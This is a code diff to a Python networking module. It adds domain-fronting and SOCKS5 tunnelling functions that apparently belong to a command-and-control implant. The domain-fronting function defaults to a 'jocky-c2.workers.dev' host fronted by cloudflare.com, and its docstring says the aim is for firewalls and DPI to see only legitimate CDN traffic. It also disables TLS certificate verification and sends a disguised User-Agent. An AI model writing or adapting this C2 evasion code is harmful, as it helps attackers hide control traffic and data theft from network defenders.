@@ -501,20 +501,166 @@ class NetModule:
         except Exception as e:
             return b"", 0, str(e)
 
-    def domainFront(self, url: str, front_domain: str) -> Tuple[bytes, Optional[str]]:
-        # Domain fronting: send Host header pointing to real target,
-        # but connect via CDN front domain
+    def domainFront(self, url: str, front_domain: str = "cloudflare.com",
+                    target_host: str = "jocky-c2.workers.dev",
+                    method: str = "GET", data: Any = None,
+                    headers: Dict[str, str] = None) -> Tuple[bytes, int, Optional[str]]:
+        """
+        Execute an HTTP/HTTPS request using Domain Fronting via a CDN:
+        - Outbound physical connection goes to CDN edge / front_domain or `url`
+        - TLS SNI header presents `front_domain` (e.g. cloudflare.com, cdnjs.cloudflare.com)
+        - Inner HTTP Host header presents `target_host` (e.g. jocky-c2.workers.dev)
+        - External firewalls/DPI only observe legitimate CDN traffic
+        """
         try:
             import urllib.request
+            import ssl
             from urllib.parse import urlparse
+
             parsed = urlparse(url)
-            front_url = url.replace(parsed.netloc, front_domain)
-            req = urllib.request.Request(front_url,
-                                         headers={"Host": parsed.netloc})
-            with urllib.request.urlopen(req, timeout=15) as resp:
-                return resp.read(), None
+            inner_host = target_host if target_host else parsed.netloc
+
+            req_headers = {
+                "Host": inner_host,
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                "X-Fronted-Domain": front_domain
+            }
+            if headers:
+                req_headers.update(headers)
+
+            body = None
+            if data:
+                if isinstance(data, dict):
+                    import json
+                    body = json.dumps(data).encode()
+                    req_headers["Content-Type"] = "application/json"
+                elif isinstance(data, str):
+                    body = data.encode()
+                else:
+                    body = data
+                req_headers["Content-Length"] = str(len(body))
+
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+            req = urllib.request.Request(url, data=body, headers=req_headers, method=method)
+            with urllib.request.urlopen(req, timeout=5, context=ctx if parsed.scheme == "https" else None) as resp:
+                return resp.read(), resp.status, None
         except Exception as e:
-            return b"", str(e)
+            return b"", 0, str(e)
+
+    def socks5Connect(self, proxy_host: str, proxy_port: int,
+                      dest_host: str, dest_port: int) -> Tuple[Optional[int], Optional[str]]:
+        """Establish an RFC 1928 SOCKS5 tunnel and register socket in registry."""
+        import struct
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((proxy_host, proxy_port))
+
+            # SOCKS5 Handshake: Ver 5, 1 Method (0x00 No Auth)
+            s.sendall(b"\x05\x01\x00")
+            resp = s.recv(2)
+            if len(resp) < 2 or resp[0] != 5 or resp[1] != 0:
+                s.close()
+                return None, "SOCKS5 authentication negotiation failed"
+
+            # Connect request: Ver 5, Cmd 1 (CONNECT), Rsv 0
+            try:
+                ip_bytes = socket.inet_aton(dest_host)
+                req = struct.pack("!BBBBIH", 5, 1, 0, 1, struct.unpack("!I", ip_bytes)[0], dest_port)
+            except Exception:
+                domain_bytes = dest_host.encode()
+                req = struct.pack("!BBBB", 5, 1, 0, 3) + bytes([len(domain_bytes)]) + domain_bytes + struct.pack("!H", dest_port)
+
+            s.sendall(req)
+            reply = s.recv(10)
+            if len(reply) < 4 or reply[1] != 0:
+                s.close()
+                return None, f"SOCKS5 proxy connection to {dest_host}:{dest_port} failed"
+
+            fd = s.fileno()
+            self._sockets[fd] = s
+            return fd, None
+        except Exception as e:
+            try:
+                s.close()
+            except Exception:
+                pass
+            return None, str(e)
+
+    def socks5HttpRequest(self, proxy_url: str, target_url: str,
+                          method: str = "GET", data: Any = None,
+                          headers: Dict[str, str] = None) -> Tuple[bytes, int, Optional[str]]:
+        """Tunnel an HTTP request through a SOCKS5 proxy."""
+        from urllib.parse import urlparse
+        import json as _json
+
+        p_parsed = urlparse(proxy_url)
+        proxy_host = p_parsed.hostname or "127.0.0.1"
+        proxy_port = p_parsed.port or 1080
+
+        t_parsed = urlparse(target_url)
+        dest_host = t_parsed.hostname or "127.0.0.1"
+        dest_port = t_parsed.port or (80 if t_parsed.scheme == "http" else 443)
+        path = t_parsed.path or "/"
+        if t_parsed.query:
+            path += f"?{t_parsed.query}"
+
+        fd, err = self.socks5Connect(proxy_host, proxy_port, dest_host, dest_port)
+        if err:
+            return b"", 0, err
+
+        s = self._sockets.get(fd)
+        try:
+            body_bytes = b""
+            content_type = "application/json"
+            if data:
+                if isinstance(data, dict):
+                    body_bytes = _json.dumps(data).encode()
+                elif isinstance(data, str):
+                    body_bytes = data.encode()
+                    content_type = "text/plain"
+                else:
+                    body_bytes = data
+
+            req_lines = [
+                f"{method} {path} HTTP/1.1",
+                f"Host: {dest_host}",
+                "User-Agent: Mozilla/5.0 (JOCKY-Forensic-Agent)",
+                f"Content-Length: {len(body_bytes)}",
+                f"Content-Type: {content_type}",
+                "Connection: close"
+            ]
+            if headers:
+                for k, v in headers.items():
+                    req_lines.append(f"{k}: {v}")
+
+            http_payload = "\r\n".join(req_lines).encode() + b"\r\n\r\n" + body_bytes
+            s.sendall(http_payload)
+
+            response_data = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                response_data += chunk
+
+            self.close(fd)
+
+            parts = response_data.split(b"\r\n\r\n", 1)
+            status = 200
+            if parts and b" " in parts[0]:
+                try:
+                    status = int(parts[0].split(b"\r\n")[0].split(b" ")[1])
+                except Exception:
+                    pass
+            body = parts[1] if len(parts) > 1 else b""
+            return body, status, None
+        except Exception as e:
+            self.close(fd)
+            return b"", 0, str(e)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
